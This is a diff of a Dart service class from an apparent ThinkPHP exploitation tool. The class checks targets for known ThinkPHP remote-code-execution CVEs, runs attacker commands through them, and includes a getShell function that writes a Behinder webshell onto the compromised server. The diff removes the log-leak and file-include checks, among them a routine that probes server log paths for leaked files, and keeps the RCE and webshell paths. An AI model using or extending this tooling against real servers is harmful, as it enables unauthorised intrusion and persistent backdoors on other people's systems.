@@ -3,7 +3,6 @@ import 'dart:convert';
 import 'package:http/http.dart' as http;
 import '../../app/constants.dart';
 import 'thinkphp_v5_exp.dart';
-import 'thinkphp_v6_exp.dart';
 
 /// ThinkPHP 漏洞利用核心逻辑（100% 复现 ThinkphpGUI）
 /// 参考: https://github.com/Lotus6/ThinkphpGUI
@@ -11,7 +10,6 @@ class ThinkphpExpService {
   final Uri baseUri;
   final Duration timeout;
   late final ThinkphpV5ExpService _v5;
-  late final ThinkphpV6ExpService _v6;
 
   ThinkphpExpService({
     required String url,
@@ -25,12 +23,9 @@ class ThinkphpExpService {
       getModule: _getModule,
       extractBeforeHtml: _extractBeforeHtml,
     );
-    _v6 = ThinkphpV6ExpService(baseUri: baseUri, timeout: timeout);
   }
 
   static const String _phpVersionCheck = 'PHP Version';
-  static const String _tp5LogErr = '[ error ]';
-  static const String _tp3LogInfo = 'INFO:';
 
   /// 默认模块检测顺序（与 ThinkphpGUI Module.java 一致）
   static const List<String> _defaultModules = ['manage', 'admin', 'api'];
@@ -84,12 +79,6 @@ class ThinkphpExpService {
   /// 5. ThinkPHP 5.0.24-5.1.30 RCE
   Future<ThinkphpResult> checkTp5024_5130() => _v5.checkTp5024_5130();
 
-  /// 6. ThinkPHP 5.x 数据库信息泄露
-  Future<ThinkphpResult> checkTp5Db() => _v5.checkTp5Db();
-
-  /// 7. ThinkPHP 5.x 日志泄露
-  Future<ThinkphpResult> checkTp5Log() => _v5.checkTp5Log();
-
   /// 8. ThinkPHP 3.x RCE
   Future<ThinkphpResult> checkTp3() async {
     final mod = await _getModule();
@@ -101,44 +90,6 @@ class ThinkphpExpService {
       }
     } catch (_) {}
     return ThinkphpResult(false, 'ThinkPHP 3.x RCE', '');
-  }
-
-  /// 9. ThinkPHP 3.x 日志泄露
-  Future<ThinkphpResult> checkTp3Log() async {
-    final now = DateTime.now();
-    final y = now.year.toString();
-    final m = now.month.toString().padLeft(2, '0');
-    final d = now.day.toString().padLeft(2, '0');
-    final suffix1 = '${y.substring(2)}_${m}_$d.log';
-    final suffix2 = '${(now.millisecondsSinceEpoch ~/ 1000).toString().substring(0, 10)}-${y.substring(2)}_${m}_$d.log';
-    final bases = [
-      '/Runtime/Logs/',
-      '/Runtime/Logs/Home/',
-      '/Runtime/Logs/Common/',
-      '/App/Runtime/Logs/',
-      '/App/Runtime/Logs/Home/',
-      '/Application/Runtime/Logs/',
-      '/Application/Runtime/Logs/Admin/',
-      '/Application/Runtime/Logs/Home/',
-      '/Application/Runtime/Logs/App/',
-      '/Application/Runtime/Logs/Ext/',
-      '/Application/Runtime/Logs/Api/',
-      '/Application/Runtime/Logs/Test/',
-      '/Application/Runtime/Logs/Common/',
-      '/Application/Runtime/Logs/Service/',
-    ];
-    for (final base in bases) {
-      for (final suffix in [suffix1, suffix2]) {
-        try {
-          final u = '${baseUri}$base$suffix'.replaceAll('//', '/');
-          final res = await http.get(Uri.parse(u)).timeout(timeout);
-          if (res.body.contains(_tp3LogInfo) || res.body.contains(_tp5LogErr)) {
-            return ThinkphpResult(true, 'ThinkPHP 3.x 日志泄露', u);
-          }
-        } catch (_) {}
-      }
-    }
-    return ThinkphpResult(false, 'ThinkPHP 3.x 日志泄露', '');
   }
 
   /// 10. ThinkPHP 3.x Log RCE
@@ -206,13 +157,6 @@ class ThinkphpExpService {
     return ThinkphpResult(false, 'ThinkPHP 3.x Module RCE', '');
   }
 
-  /// 16. ThinkPHP 5.x Lang/load 任意文件包含（tp5_file_include）
-  /// 需开启多语言 lang_switch_on，影响 TP5.0.x / 5.1.x / 6.0.1-6.0.13
-  Future<ThinkphpResult> checkTp5FileInclude() => _v5.checkTp5FileInclude();
-
-  /// 17. ThinkPHP 5.0.22 config/get 信息泄露（POC #1-2）
-  Future<ThinkphpResult> checkTp5ConfigGet() => _v5.checkTp5ConfigGet();
-
   /// 18. ThinkPHP 3.x module/aciton 拼写变体（POC #18）
   Future<ThinkphpResult> checkTp3ModuleTypo() async {
     final mod = await _getModule();
@@ -225,9 +169,6 @@ class ThinkphpExpService {
     } catch (_) {}
     return ThinkphpResult(false, 'ThinkPHP 3.x module/aciton RCE', '');
   }
-
-  /// 19. ThinkPHP 6.x 日志泄露
-  Future<ThinkphpResult> checkTp6Log() => _v6.checkTp6Log();
 
   // ========== 批量检测 ==========
 
@@ -250,26 +191,14 @@ class ThinkphpExpService {
         return checkTp5ViewDisplay();
       case ThinkphpVulnType.tp5MethodFilter:
         return checkTp5MethodFilter();
-      case ThinkphpVulnType.tp5FileInclude:
-        return checkTp5FileInclude();
-      case ThinkphpVulnType.tp5ConfigGet:
-        return checkTp5ConfigGet();
-      case ThinkphpVulnType.tp5Db:
-        return checkTp5Db();
-      case ThinkphpVulnType.tp5Log:
-        return checkTp5Log();
       case ThinkphpVulnType.tp3:
         return checkTp3();
       case ThinkphpVulnType.tp3Module:
         return checkTp3Module();
       case ThinkphpVulnType.tp3ModuleTypo:
         return checkTp3ModuleTypo();
-      case ThinkphpVulnType.tp3Log:
-        return checkTp3Log();
       case ThinkphpVulnType.tp3LogRce:
         return checkTp3LogRce();
-      case ThinkphpVulnType.tp6Log:
-        return checkTp6Log();
       case ThinkphpVulnType.tp2:
         return checkTp2();
     }
@@ -296,17 +225,11 @@ class ThinkphpExpService {
       ThinkphpVulnType.tp5024_5130,
       ThinkphpVulnType.tp5ViewDisplay,
       ThinkphpVulnType.tp5MethodFilter,
-      ThinkphpVulnType.tp5FileInclude,
       ThinkphpVulnType.tp3,
       ThinkphpVulnType.tp3Module,
       ThinkphpVulnType.tp3ModuleTypo,
       ThinkphpVulnType.tp3LogRce,
     ]);
-  }
-
-  /// 检测全部漏洞（含信息泄露）
-  Future<List<ThinkphpResult>> checkAll() async {
-    return checkMultiple(ThinkphpVulnType.values);
   }
 
   // ========== RCE 命令执行 ==========
@@ -334,7 +257,6 @@ class ThinkphpExpService {
       case ThinkphpVulnType.tp5023Debug:
       case ThinkphpVulnType.tp5ViewDisplay:
       case ThinkphpVulnType.tp5MethodFilter:
-      case ThinkphpVulnType.tp5FileInclude:
       case ThinkphpVulnType.tp5024_5130:
         return _v5.exeRce(type, cmd);
       case ThinkphpVulnType.tp3Module:
@@ -368,13 +290,11 @@ class ThinkphpExpService {
         final res = await http.get(Uri.parse(logRes)).timeout(timeout);
         return res.body.contains(_phpVersionCheck) ? res.body : null;
 
-      default:
-        return null;
     }
   }
 
   /// GetShell（写入 php_behinder.php，使用内置冰蝎马）
-  /// [shellContent] 为 assets/defaults/payloads/php_behinder.php 的内容
+  /// [shellContent] 为 assets/defaults/payloads/webshell/php_behinder.php 的内容
   Future<String?> getShell(
     ThinkphpVulnType type,
     String shellContent, {
@@ -404,7 +324,6 @@ class ThinkphpExpService {
       case ThinkphpVulnType.tp5023Debug:
       case ThinkphpVulnType.tp5ViewDisplay:
       case ThinkphpVulnType.tp5MethodFilter:
-      case ThinkphpVulnType.tp5FileInclude:
       case ThinkphpVulnType.tp5024_5130:
         return _v5.getShell(type, shellContent, password: password);
       case ThinkphpVulnType.tp3Module:
@@ -456,8 +375,6 @@ class ThinkphpExpService {
         if (check.statusCode == 200) return '$logRes Pass:$shellPass';
         return null;
 
-      default:
-        return null;
     }
   }
 
@@ -480,16 +397,10 @@ enum ThinkphpVulnType {
   tp5024_5130,
   tp5ViewDisplay,
   tp5MethodFilter,
-  tp5FileInclude,
-  tp5ConfigGet,
-  tp5Db,
-  tp5Log,
   tp3,
   tp3Module,
   tp3ModuleTypo,
-  tp3Log,
   tp3LogRce,
-  tp6Log,
 }
 
 extension ThinkphpVulnTypeExt on ThinkphpVulnType {
@@ -513,56 +424,24 @@ extension ThinkphpVulnTypeExt on ThinkphpVulnType {
         return 'ThinkPHP CVE-2018-20062 · 5.x View/display RCE';
       case ThinkphpVulnType.tp5MethodFilter:
         return 'ThinkPHP CVE-2019-9082 · 5.x _method=filter RCE';
-      case ThinkphpVulnType.tp5FileInclude:
-        return 'ThinkPHP CNVD-2022-86535 · 5.x/6.x Lang/load LFI';
-      case ThinkphpVulnType.tp5ConfigGet:
-        // 部分 Zentao 18.x 复用该配置接口，结果常出现在禅道环境中
-        return 'ThinkPHP 5.0.22 · config 泄露（Zentao 18.x 组件常见）';
-      case ThinkphpVulnType.tp5Db:
-        return 'ThinkPHP 5.x · 数据库信息泄露';
-      case ThinkphpVulnType.tp5Log:
-        return 'ThinkPHP 5.x · 日志泄露';
       case ThinkphpVulnType.tp3:
         return 'ThinkPHP 3.x · RCE';
       case ThinkphpVulnType.tp3Module:
         return 'ThinkPHP 3.x · Module RCE';
       case ThinkphpVulnType.tp3ModuleTypo:
         return 'ThinkPHP 3.x · module/action RCE';
-      case ThinkphpVulnType.tp3Log:
-        return 'ThinkPHP 3.x · 日志泄露';
       case ThinkphpVulnType.tp3LogRce:
         return 'ThinkPHP 3.x · Log RCE';
-      case ThinkphpVulnType.tp6Log:
-        return 'ThinkPHP 6.x · 日志泄露';
     }
   }
 
   bool get supportsRce {
-    switch (this) {
-      case ThinkphpVulnType.tp2:
-      case ThinkphpVulnType.tp50:
-      case ThinkphpVulnType.tp5010:
-      case ThinkphpVulnType.tp5022_5129:
-      case ThinkphpVulnType.tp5023:
-      case ThinkphpVulnType.tp5023Debug:
-      case ThinkphpVulnType.tp5024_5130:
-      case ThinkphpVulnType.tp5ViewDisplay:
-      case ThinkphpVulnType.tp5MethodFilter:
-      case ThinkphpVulnType.tp5FileInclude: // 支持读文件（命令框填路径）
-      case ThinkphpVulnType.tp3:
-      case ThinkphpVulnType.tp3Module:
-      case ThinkphpVulnType.tp3ModuleTypo:
-      case ThinkphpVulnType.tp3LogRce:
-        return true;
-      default:
-        return false;
-    }
+    return true;
   }
 
-  /// 是否支持 GetShell（文件包含类不支持直接写马）
+  /// 是否支持 GetShell
   bool get supportsGetShell {
-    if (!supportsRce) return false;
-    return this != ThinkphpVulnType.tp5FileInclude;
+    return supportsRce;
   }
 }
 
